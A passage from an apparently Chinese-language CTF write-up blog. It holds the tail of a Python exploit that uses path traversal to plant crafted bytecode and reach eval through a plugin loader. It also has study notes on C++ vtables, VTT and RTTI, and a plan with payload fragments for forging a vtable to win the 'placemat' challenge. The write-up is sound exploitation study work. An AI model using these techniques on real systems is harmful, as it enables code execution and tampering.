class="hljs-comment"># LOAD_GLOBAL (eval)</span><br>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(pychunks)):<br>    code += <span class="hljs-built_in">bytes</span>([<span class="hljs-number">100</span>,i])  <span class="hljs-comment"># LOAD_CONST</span><br>    <span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">0</span>:<br>        code += <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x17</span>,<span class="hljs-number">0x00</span>]) <span class="hljs-comment"># BINARY_ADD</span><br>code += <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0x09</span>,<span class="hljs-number">0xc2</span>,  <span class="hljs-comment"># NOP</span><br>    <span class="hljs-number">0x83</span>,<span class="hljs-number">0x01</span>, <span class="hljs-comment"># LOAD_METHOD (eval) 这是什么东西, 明明是CALL_FUNCTION</span><br>    <span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>, <span class="hljs-comment"># POP_TOP</span><br>    <span class="hljs-number">100</span>,<span class="hljs-number">0x00</span>, <span class="hljs-comment"># LOAD_CONST (None)</span><br>    <span class="hljs-number">83</span>,<span class="hljs-number">0x00</span>, <span class="hljs-comment"># RETURN_VALUE</span><br>])<br>data = code + <span class="hljs-string">b&quot;;eval;&quot;</span><br>blocks = chunks(data, <span class="hljs-number">12</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pos_func = <span class="hljs-number">0x33</span> + <span class="hljs-built_in">len</span>(blocks)<br>code = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(blocks)):<br>    code += <span class="hljs-built_in">bytes</span>([<br>        <span class="hljs-number">100</span>,pos_func, <span class="hljs-number">100</span>,<span class="hljs-number">0x30</span>, <span class="hljs-number">100</span>,<span class="hljs-number">0x30</span>, <span class="hljs-number">100</span>,<span class="hljs-number">0x30</span>, <span class="hljs-comment"># func</span><br>        <span class="hljs-number">100</span>,<span class="hljs-number">0x30</span>, <span class="hljs-number">100</span>,<span class="hljs-number">0x32</span>, <span class="hljs-number">100</span>,<span class="hljs-number">0x33</span>+i, <span class="hljs-comment"># raw, filename, msg</span><br>        <span class="hljs-number">49</span>, <span class="hljs-number">0x30</span>, <span class="hljs-comment"># call by exception</span><br>    ])<br>code += <span class="hljs-built_in">bytes</span>([<span class="hljs-number">53</span>,<span class="hljs-number">53</span>])<br><span class="hljs-keyword">for</span> piece <span class="hljs-keyword">in</span> pychunks:<br>    store(piece, <span class="hljs-string">b&quot;whatever&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span> - <span class="hljs-built_in">len</span>(pychunks)):<br>    store(<span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x41</span> + i] * <span class="hljs-number">12</span>), <span class="hljs-string">b&quot;whatever&quot;</span>)<br>store(<span class="hljs-string">b&quot;../plugins/A&quot;</span>, <span class="hljs-built_in">bytes</span>.fromhex(code.decode()))<br>store(<span class="hljs-string">b&quot;\x00&quot;</span>, <span class="hljs-string">b&quot;whatever&quot;</span>) <span class="hljs-comment"># stop</span><br>store(<span class="hljs-string">b&quot;.//plugins/B&quot;</span>, <span class="hljs-string">b&quot;whatever&quot;</span>) <span class="hljs-comment"># filename</span><br><span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>    store(block, <span class="hljs-string">b&quot;whatever&quot;</span>) <span class="hljs-comment"># data</span><br><span class="hljs-comment"># write ascii bytecode</span><br>dump()<br>time.sleep(<span class="hljs-number">0.1</span>)<br>plugin(<span class="hljs-string">b&quot;0123456789/A&quot;</span>)<br><span class="hljs-comment"># win!</span><br>time.sleep(<span class="hljs-number">0.1</span>)<br>plugin(<span class="hljs-string">b&quot;0123456789/B&quot;</span>)<br></code></pre></div></td></tr></table></figure><h2 id="RIOT"><a href="#RIOT" class="headerlink" title="RIOT"></a>RIOT</h2><p>RIOT src <a href="https://github.com/RIOT-OS/RIOT/blob/a21f05aeffd9fdf0e61026d85b465c652a9cf8c9/drivers/ethos/ethos.c#L379">off-by-one</a> </p><ul><li></li><li></li></ul><h2 id="placemat"><a href="#placemat" class="headerlink" title="placemat"></a>placemat</h2><ul><li>看到一个meson.build文件, 才知道这是一个和cmake同类型的build scripts generation. Wiki<a href="https://en.wikipedia.org/wiki/List_of_build_automation_software">在此</a> </li></ul><p>居然是32位程序, 除了PIE其他都开了. </p><p>woc为什么在ubuntu上运行不了?? 2.34用allinone装上之后都没有了符号链接, 这能用???? 在ubuntu2004 22204里运行都给我说no such file or directory. 差不多得了. </p><p>搞不定这个环境. 理解不能, 这c++的库都是用的啥? glibc不能直接用吧. 果然还是放弃这种比赛题比较实际, 大半天啥也没试出来. 又被crazyman叫来看看, 我…还是试试从源码编译吧…</p><ul><li>学了两下meson: <code>meson setup [build directory]</code> <code>cd [build directory] &amp;&amp; meson compile</code> <ul><li>每个build directory都有各自的配置, 分成一个个文件夹便于测试. </li><li><code>meson compile == ninja</code>, 因为meson的默认backend是ninja. </li></ul></li><li>发现缺失<code>bits/c++config.h</code>, 然后准备安装<code>g++-multilib</code>, 然后又发现kali里的libc6-dev版本过低导致依赖的libglib2.0-dev也较低, 结果是libglib2.0-dev无法安装更新版本. 执行<code>pc apt --only-upgrade install libc6-dev</code>后解决. 最终执行<br><code>apt install g++-multilib</code>. </li></ul><p>怎么调试C++里面的类和一些变量布局我还得熟悉下. </p><ul><li>看了看C++17的optional. <a href="https://devblogs.microsoft.com/cppblog/stdoptional-how-when-and-why/">post</a> 就像是刚刚看的rust里的Option&lt;T&gt;. </li><li>额还得看看c++编译器是怎么实现class的. 找个<a href="https://zhuanlan.zhihu.com/p/508050978">文章</a>.  </li></ul><hr><p>可能有的问题:</p><ul><li>Human::requestName中<code>scanf(&quot;%s&quot;, this-&gt;name);</code>没有限制长度. 鬼知道溢出到了什么地方. 好了现在知道了.</li><li>还有个strcpy有个非常没用的栈溢出. </li><li>flag的获取必须是赢过bot. </li></ul><p>然后队里别人先做出来了(不出所料), 是伪造虚表然后装成bot, 自己赢过自己获取flag. 我先调试看看c++的class<strong>怎么布局</strong>的. </p><ul><li>首先研究构造函数, 发现<code>Human human</code>声明语句即构造函数调用语句, 参数为栈上指针, 大小为ebp-0x20的位置, 这个就是this指针. 然后继续调用父类构造清空name成员, name成员由this来定位. 不过name不是this指向的空间, 前四字节是用来标识子类的一串数字(也许有什么特殊含义). 好吧原来是虚表地址, <em>对象的虚表指针用来指向自己所属类的虚表，虚表中的指针会指向其继承的<strong>最近的</strong>一个类的虚函数</em>. 地址到IDA里看看更多信息. </li><li>Player这个基类的两个函数加析构都是虚函数, 但是析构没有定义, 所以在<strong>虚表里面是NULL</strong>.  </li><li>超出作用域的class直接调用析构函数, 如局部class在函数末尾的析构. </li><li>注意到文件里除了vtable for Bot之类的还有</li><li>果然还是ABI标准更全面一些. <del>省的自己在这儿乱研究</del>. 标准真的太长了. <a href="https://stackoverflow.com/questions/60454989/how-is-type-info-implemented">stackoverflow</a> </li></ul><p>继续研究:</p><ul><li>在startSingleplayer()函数栈帧里存储有两个玩家的object, 以虚指针开头总共4(vptr)+20(name)=24=0x18字节, 初始name被填满空字符, 输入玩家名称时可以填满20字节<del>达到leak之后的数据的目的</del>. scanf会加空字符, 必须修改后才能leak. </li><li>human是栈上靠近栈底的变量, 在[ebp-0x20]的位置, 0xc(12)处还有个canary, 栈底八字节没啥用处</li><li><del>takeTurn中又是%s, 输出长度没有限制.</del>  </li></ul><blockquote><p>重大发现, 这个程序是32位的, 所以要用32位库. 真是好一个重大发现, 难怪patchelf和ubuntu2204(默认没有32位运行环境)都不行. 好的下了debian32位2.35libc成功了. </p></blockquote><blockquote><p>绝了, 自己编译的做不出来, 但是源文件是可以的, <del>因为两个class离canary有更大的距离,</del> 因为Game class放到了两个Player class的后面, 而Game前几个成员变量是player opponent之类的, 可以解决scanf默认添加的空字符问题. emmmm这样究竟是怎么出题的, 是巧合还是能控制变量在栈上的位置? 但是源文件调试是真的不爽, 什么符号都没有. 难不成要ida修复符号然后远程调试? 想想都麻烦. 而且有些输入不是我能打出来的. 还是pwntools吧. </p></blockquote><blockquote><ul><li><del>我是不明白为什么random::bit会一直只选第一个玩家, 完全没有随机性可言. 但是自己编译的程序就可以. (????????)</del> <del>只是我运气好罢了.</del> 居然是下面这个问题的原因. </li><li>为什么都定义了%20s了但是在printPlayerNames还是会打印出超过20个字符???????什么魔法啊这是.<br>我又知道了, 原来scanf和printf也是不一样的. <code>printf(&quot;%20s&quot;, buf);</code>限制的只是对齐宽度, 如果字符串更长就会忽略这个对齐. <code>%20s</code>用在scanf里才是限制输入的string, 然而在printf里如果要限制输出长度则要用<code>%.20s</code>, 或者是在参数中提供长度<code>%.*s</code>(还可以是某个位置的参数, 具体见printf手册)(左对齐是<code>%-20s</code>)</li></ul></blockquote><ul><li>在congratulate中看到<a href="https://en.cppreference.com/w/cpp/language/typeid"><code>typeid</code></a>宏, 对一个多态对象求类型id. 实质上是???? 只查到是查个虚表, 待我看看汇编. 看到了<a href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html">c++ abi</a>, 然而内容太多我抓不住重点. 又找了一个series <a href="https://shaharmike.com/cpp/vtable-part1/">blog</a>. 真的太多了, 但我真的想看懂ABI.<br>不如Stack Overflow里的<a href="https://stackoverflow.com/questions/6258559/what-is-the-vtt-for-a-class">清楚</a> 还是有例子的好些, 一堆文字真的很难看懂. </li></ul><h3 id="c-abi-vtables-amp-RTTI"><a href="#c-abi-vtables-amp-RTTI" class="headerlink" title="c++ abi (vtables &amp; RTTI)"></a>c++ abi (vtables &amp; RTTI)</h3><h4 id="vtable"><a href="#vtable" class="headerlink" title="vtable:"></a>vtable:</h4><ul><li><p>_ZTV is a prefix for vtable, _ZTS is a prefix for type-string (name) and _ZTI is for type-info.</p></li><li><p>重要的概念</p><ul><li><em>primary base class</em>: For a dynamic class, the unique base class (if any) with which it shares the virtual pointer at offset 0.</li><li><em>proper base class</em>: 继承树中一个类的所有父类</li><li><em>secondary virtual table</em>: The instance of a virtual table for a base class that is <strong>embedded</strong> in the virtual table of a class derived from it.</li><li><em>The primary virtual table</em> can be viewed as two virtual tables accessed from <strong>a shared virtual table</strong> pointer. </li><li><em>virtual table group</em>: The primary virtual table for a class along with all of the associated secondary virtual tables for its proper base classes.</li></ul></li><li><p><a href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html#vtable-components">vtable components</a> </p><ul><li><em>Virtual Base (vbase) offsets</em> are used to access the virtual bases of an object.</li><li>The <em>offset to top</em> holds the displacement to the top of the object from the location within the object of the virtual table pointer that addresses this virtual table</li><li>The <em>typeinfo pointer</em> points to the typeinfo object used for RTTI </li><li>The virtual table address point <strong>points here</strong> </li><li><em>Virtual function pointers</em>. Each pointer holds either the address of a virtual function of the class, or the address of a secondary entry point that performs certain adjustments before transferring control to a virtual function.</li></ul></li><li><p><a href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html#vtable-construction">vtable construction</a> 详细讲了proper base class在各种情况下应该怎样构建vtable. </p><ul><li>比如<br><code>No inherited virtual functions</code><br><code>No virtual base classes</code><br><code>Declares virtual functions</code>时, vtable就是简单的offset-to-top &amp; RTTI fields &amp; virtual function pointers</li><li>………………………………….</li></ul></li><li><p>The elements of the VTT array for a class D:<br>which is declared for each class type that <strong>has indirect or direct virtual base classes</strong>.</p><ul><li><p><strong>Primary virtual pointer</strong></p><p>: address of the primary virtual table for the complete object D.</p></li><li><p><strong>Secondary VTTs</strong></p><p>: for each direct non-virtual proper base class B of D that requires a VTT, in declaration order, a sub-VTT for B-in-D, structured like the main VTT for B, with a primary virtual pointer, secondary VTTs, and secondary virtual pointers, but without virtual VTTs.</p><p><img src="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif" alt="&lt;b&gt;NOTE&lt;/b&gt;:"> <em>This construction is applied recursively.</em></p></li><li><p><strong>Secondary virtual pointers</strong></p><p>: for each base class X which (a) has virtual bases or is reachable along a virtual path from D, and (b) is not a non-virtual primary base, the address of the virtual table for X-in-D or an appropriate construction virtual table.</p><p>X is reachable along a virtual path from D if there exists a path X, B1, B2, …, BN, D in the inheritance graph such that at least one of X, B1, B2, …, or BN is a virtual base class.</p><p>The order in which the virtual pointers appear in the VTT is inheritance graph preorder.</p><p><img src="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif" alt="&lt;b&gt;NOTE&lt;/b&gt;:"> <em>There are virtual pointers for direct and indirect base classes. Although primary non-virtual bases do not get secondary virtual pointers, they do not otherwise affect the ordering.</em></p><p><em>Primary virtual bases require a secondary virtual pointer in the VTT because the derived class with which they will share a virtual pointer is determined by the most derived class in the hierarchy.</em></p><p><em>Secondary virtual pointers may be required for base classes that do not require secondary VTTs. A virtual base with no virtual bases of its own does not require a VTT, but does require a virtual pointer entry in the VTT.</em> </p></li><li><p><strong>Virtual VTTs</strong></p><p>: For each proper virtual base classes in inheritance graph preorder, construct a sub-VTT as in (2) above.</p><p><img src="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif" alt="&lt;b&gt;NOTE&lt;/b&gt;:"> <em>The virtual VTT addresses come last because they are only passed to the virtual base class constructors for the complete object.</em></p></li></ul></li><li><p>单继承</p><ul><li>子类虚表如下, 注意子类内存中虚表指针指向下表第三项. 即跳过前两项. </li></ul><table><thead><tr><th>Address</th><th>Value</th><th>Meaning</th></tr></thead><tbody><tr><td>0x400b40</td><td>0x0</td><td><code>top_offset</code> (more on this later)</td></tr><tr><td>0x400b48</td><td>0x400b90</td><td>Pointer to <code>typeinfo for Derived</code> (also part of the above memory dump)</td></tr><tr><td>0x400b50</td><td>0x400a80</td><td>Pointer to <code>Derived::Foo()</code>3. <strong><code>Derived</code>’s _vptr points here.</strong></td></tr><tr><td>0x400b58</td><td>0x400a90</td><td>Pointer to <code>Parent::FooNotOverridden()</code> (same as <code>Parent</code>’s)</td></tr></tbody></table></li><li><p>多继承</p><ul><li>多继承时最下层的子类的内存中有多个指针, 如下表所示. 为什么内存中还有两个vptr? 因为child可能被转换为<code>Father*</code>或者<code>Mother*</code>类型的指针当做参数传递, 此时接收参数的函数不需要知道child的存在也能够访问下面内存布局中的Father部分. data显然在要其中, 而Father的虚表指针自然也会在这里, 指向child vtable以提供虚函数的信息. </li></ul><table><thead><tr><th>_vptr$Mother</th></tr></thead><tbody><tr><td>mother_data (+ padding)(这是什么padding??)</td></tr><tr><td>_vptr$Father = non-virtual thunk to Child::FatherFoo(void)</td></tr><tr><td>father_data</td></tr><tr><td>child_data1</td></tr></tbody></table><ul><li>值得注意的是现在child vtable里实际上装下了<strong>两个table</strong>. 如下vtable的第二部分. </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">; `vtable for&#x27;Child<br>  _ZTV5Child       dq 0                    ; offset to this<br>                   dq offset _ZTI5Child    ; `typeinfo for&#x27;Child<br>  off_555555557D48 dq offset _ZN6Mother9MotherFooEv<br>                                          ; DATA XREF: main+8↑o<br>                                          ; Mother::MotherFoo(void)<br>                   dq offset _ZN5Child9FatherFooEv ; Child::FatherFoo(void)<br>                   dq -8                   ; offset to this<br>                   dq offset _ZTI5Child    ; `typeinfo for&#x27;Child<br>  off_555555557D68 dq offset _ZThn8_N5Child9FatherFooEv<br>   ; `non-virtual thunk to&#x27;Child::FatherFoo(void)<br></code></pre></div></td></tr></table></figure></li><li><p><strong>但是</strong>, 当子类继承父类时<strong>重载了</strong>父类函数, 为了要使 利用多态将<code>child* this</code>的指针转换为<code>father* this</code>然后<code>ptr-&gt;FatherFoo()</code>的函数能够执行<strong>child</strong>::FatherFoo(), 编译器会识别到重载的存在, 并生成上表的child class结构, 并且生成一个thunk代码片段代替Father::Foo()来调整this指针使得其变成child的class ptr. 其中<code>_vptr$Father</code>指向的secondary virtual table中会是这个thunk的地址. </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.text:0000555555555227 ; __int64 __fastcall `non-virtual thunk to&#x27;Child::FatherFoo(Child *__hidden this)<br>.text:0000555555555227                 public _ZThn8_N5Child9FatherFooEv<br>.text:0000555555555227 _ZThn8_N5Child9FatherFooEv proc near<br>.text:0000555555555227                 sub     rdi, 8          ; this<br>.text:000055555555522B                 jmp     short _ZN5Child9FatherFooEv ; Child::FatherFoo(void)<br>.text:000055555555522B _ZThn8_N5Child9FatherFooEv endp<br></code></pre></div></td></tr></table></figure><ul><li>vtable中top_offset即为-8的那一行,  看起来只是提供一个信息提示, 指child内存中Father部分到内存top的距离.<br>thunk代码中直接使用<code>sub rdi, 8</code>并未引用该处数据. </li></ul></li><li><p>三重多继承, 虚继承Grandparent class.</p><ul><li>新东西: <code>construction vtable for Parent1-in-Child</code> <code>VTT for Child</code> <code>virtual-base offset</code> </li><li><code>virtual-base offset</code>是针对Child::Child()中Patent1初始化时要访问Grandpatent数据时, this指针(此时指向Child内存中Parent1部分, 也就是Child开头)到child内存中Grandpatent部分的偏移量. </li><li>IDA中<code>construction vtable for Patent1-in-Child</code>和<code>vtable for Parent</code>基本重叠, 除了前者开头的<code>virtual-base offset</code>在后者上方.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">; `construction vtable for&#x27; Parent1-in-Child<br>_ZTC5Child0_7Parent1 dq 20h ; that is virtual-base offset<br>; `vtable for&#x27; Parent1<br>...<br></code></pre></div></td></tr></table></figure><ul><li>VTT</li></ul><table><thead><tr><th>Address</th><th>Value</th><th>Symbol</th><th>Meaning</th></tr></thead><tbody><tr><td>0x4009a0</td><td>0x400950</td><td><code>vtable for Child + 24</code></td><td><code>Parent1</code>’s entries in <code>Child</code>’s vtable</td></tr><tr><td>0x4009a8</td><td>0x4009f8</td><td><code>construction vtable for Parent1-in-Child + 24</code></td><td><code>Parent1</code>’s methods in <code>Parent1-in-Child</code></td></tr><tr><td>0x4009b0</td><td>0x400a18</td><td><code>construction vtable for Parent1-in-Child + 56</code></td><td><code>Grandparent&#39;s methods for Parent1-in-Child</code></td></tr><tr><td>0x4009b8</td><td>0x400a98</td><td><code>construction vtable for Parent2-in-Child + 24</code></td><td><code>Parent2&#39;s methods in Parent2-in-Child</code></td></tr><tr><td>0x4009c0</td><td>0x400ab8</td><td><code>construction vtable for Parent2-in-Child + 56</code></td><td>`Grandparent’s methods for Parent2-in-Child</td></tr><tr><td>0x4009c8</td><td>0x400998</td><td><code>vtable for Child + 96</code></td><td>`Grandparent’s entries in Child’s vtable</td></tr><tr><td>0x4009d0</td><td>0x400978</td><td><code>vtable for Child + 64</code></td><td>`Parent2’s entries in Child’s vtable</td></tr></tbody></table><p>为什么会有VTT? 来看看child的初始化就明白了:</p><ul><li>首先Grandparent construction, 初始化vtable指针指向primary vtable. </li><li>然后Parent1初始化Child内存中的vtable ptr为VTT中Parent1-in-Child值(也就是vtable for Parent1),<br><strong>再修改GrandParent vtable指针指向其vtable中的Grandparent部分</strong>. 关键在于Parent1如何知道其子类Child内存中Grandparent和他自身的距离? 方法就是传入了VTT地址, 两个Parent1-in-Child指针指示了对应的construction table和该table中的vbase offset. <ul><li>其实这种情况下只传一个指针也是足够的, 但是当parent也有多个基类时就不得不使用VTT了, 很明显需要访问其多个基类的secondary vtable中的vbase offset来确定多个基类的vtable指针值(都在Child内存中). </li></ul></li><li>然后Parent2继续初始化并且又修改了Grandparent的vtable指针. </li><li>因为基类的构造不应假设是其子类调用的构造函数, 所以最后Child把所有vtable指针值改向了Child vtable中的几个父类部分. </li></ul><p>如果情况变成</p></li><li><p>“in-charge” and “not-in-charge” constructor and destructor: stackoverflow<a href="https://stackoverflow.com/questions/6258559/what-is-the-vtt-for-a-class#:~:text=Now%2C%20in%20fact%2C%20the%20story%20is%20somewhat%20more%20complicated.">解释</a>  </p><blockquote><p>构造函数可以不一样: 还是上面的例子, 如果出现了Child的定义, 但是还出现了Parent的定义, 就会有两个Parent构造函数,一个只用在Child::Child()中, 另一个用在Parent自身的构造之中. 也是所谓的in or not in charge constructor</p></blockquote><ul><li>An “in-charge” (or complete object) constructor is one that constructs virtual bases,<br>and a “not-in-charge” (or base object) constructor is one that does not.</li><li>嗯, 不想看了. 还有一些destructor的东西. </li></ul></li><li><p>多重继承时vtable最后的是VTT, 也就是vtable的table. </p></li></ul><h4 id="RTTI"><a href="#RTTI" class="headerlink" title="RTTI:"></a><strong>RTTI</strong>:</h4><ul><li>The typeid operator produces a <strong>reference</strong> to a std::type_info structure with the following public interface</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"> <span class="hljs-keyword">namespace</span> std &#123;<br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">type_info</span> &#123;</span><br>     <span class="hljs-keyword">public</span>:<br><span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">type_info</span>();<br><span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span>==(<span class="hljs-keyword">const</span> type_info &amp;) <span class="hljs-keyword">const</span>;<br><span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span>!=(<span class="hljs-keyword">const</span> type_info &amp;) <span class="hljs-keyword">const</span>;<br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">before</span><span class="hljs-params">(<span class="hljs-keyword">const</span> type_info &amp;)</span> <span class="hljs-keyword">const</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* <span class="hljs-title">name</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>;<br>     <span class="hljs-keyword">private</span>:<br><span class="hljs-built_in">type_info</span> (<span class="hljs-keyword">const</span> type_info&amp; rhs);<br>type_info&amp; <span class="hljs-keyword">operator</span>= (<span class="hljs-keyword">const</span> type_info&amp; rhs);<br>   &#125;;<br> &#125;<br></code></pre></div></td></tr></table></figure><ul><li>除了指向不完全类型的直接或间接指针外，相等和不等操作符在操作type_info对象时可以写成地址比较:两个type_info结构体当且仅当它们是相同的结构体(在相同的地址)时，它们描述的是相同的类型。</li><li>layout<ul><li><code>abi::__class_type_info</code> is used for class types having no bases, and is also a base type for the other two class type representations.</li><li>不看了. </li></ul></li><li><a href="https://bbs.pediy.com/thread-268094.htm">看雪blog</a> </li></ul><hr><h3 id="BIN"><a href="#BIN" class="headerlink" title="BIN"></a>BIN</h3><p>真的会累死. 回过头来一看typeid也就是这么点东西: </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">char</span> __cdecl <span class="hljs-built_in">std</span>::type_info::<span class="hljs-keyword">operator</span>==(<span class="hljs-built_in">std</span>::type_info *a1, <span class="hljs-built_in">std</span>::type_info *a2)<br>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *v3; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)<span class="hljs-built_in">std</span>::__is_constant_evaluated() )<br>    <span class="hljs-keyword">return</span> a1 == a2;<br>  <span class="hljs-keyword">if</span> ( *((_DWORD *)a1 + <span class="hljs-number">1</span>) == *((_DWORD *)a2 + <span class="hljs-number">1</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( **((_BYTE **)a1 + <span class="hljs-number">1</span>) == <span class="hljs-number">42</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  v3 = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)<span class="hljs-built_in">std</span>::type_info::name(a2);<br>  <span class="hljs-keyword">return</span> !<span class="hljs-built_in">strcmp</span>(*((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **)a1 + <span class="hljs-number">1</span>), v3);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>第二个if直接比较的是demangled name. 但是简单的修改指针为Bot虚表会导致执行Bot::taketurn对象函数. 所以我们需要伪造整个虚表,就在栈上, 所以才需要leak栈指针. 这个修改发生在第二局, 此时进入的是Game::Multiplayer(), 就算破坏canary也没有关系, 能够在Game::play()函数里执行congratulate就可以了. </p><blockquote><p>嗯, 需不需要四字节对齐? 好吧栈上的东西已经是对齐的了, 只要从name开头就可以. </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.rodata:0804C35C                 dd 0                    ; offset to this<br>.rodata:0804C360                 dd offset _ZTI5Human    ; `typeinfo for&#x27;Human<br>.rodata:0804C364 off_804C364     dd offset _ZN5HumanD2Ev ; DATA XREF: Human::Human(void)+15↑o<br>.rodata:0804C364                                         ; Human::~Human()+6↑o<br>.rodata:0804C364                                         ; Human::~Human()<br>.rodata:0804C368                 dd offset sub_804AEF2<br>.rodata:0804C36C                 dd offset requestName<br>.rodata:0804C370                 dd offset Human__takeTurn<br><br>.rodata:0804C1D4 ; `typeinfo for&#x27;Bot<br>.rodata:0804C1D4 _ZTI3Bot        dd offset unk_804EEC8   ; DATA XREF: sub_804AA96+8C↑o<br>.rodata:0804C1D4                                         ; .rodata:0804C1A8↑o<br>.rodata:0804C1D8                 dd offset a3bot         ; &quot;3Bot&quot;<br>.rodata:0804C1DC                 dd offset off_804C1E8<br></code></pre></div></td></tr></table></figure><p>伪造成上面这个样子, 除了typeinfo部分要换成Bot的typeinfo地址. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl1 = flat([<span class="hljs-string">b&#x27;yog&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>), p2_name_addr])<br>pl2 = flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x804C1D4</span>, <span class="hljs-number">0x804AED0</span>, <span class="hljs-number">0x804AEF2</span>, <span class="hljs-number">0x804AF18</span>, <span class="hljs-number">0x804AF4E</span>])<br></code></pre></div></td></tr></table></figure><p>注意Game class没有虚表指针, 不要看多了就看什么都是虚表. </p><p>好吧这样不行, 忽略了后面紧跟着的Game. 会被<strong>覆盖</strong>.</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs 